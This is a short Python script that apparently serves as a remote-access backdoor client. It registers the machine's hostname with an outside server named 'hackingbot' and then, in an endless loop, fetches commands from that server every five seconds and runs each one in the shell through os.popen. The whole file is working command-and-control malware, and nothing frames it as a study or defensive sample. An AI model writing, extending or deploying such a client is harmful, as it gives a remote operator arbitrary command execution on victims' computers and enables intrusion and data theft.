import requests
import socket
import time
import os

SERVER_URL = "https://hackingbot.alwaysdata.net"  # server manzili
DEVICE_ID = socket.gethostname()

def register():
    try:
        r = requests.post(f"{SERVER_URL}/register", json={
            "deviceId": DEVICE_ID,
            "hostname": socket.gethostname()
        })
        print("Registered:", r.json())
    except Exception as e:
        print("Register error:", e)

def get_commands():
    try:
        r = requests.get(f"{SERVER_URL}/get_commands/{DEVICE_ID}")
        data = r.json()
        return data.get("commands", [])
    except Exception as e:
        print("Error get_commands:", e)
        return []

def run():
    register()
    while True:
        cmds = get_commands()
        for cmd in cmds:
            print(f"Running: {cmd}")
            try:
                output = os.popen(cmd).read()
                print("Output:", output)
            except Exception as e:
                print("Command error:", e)
        time.sleep(5)

if __name__ == "__main__":
    run()
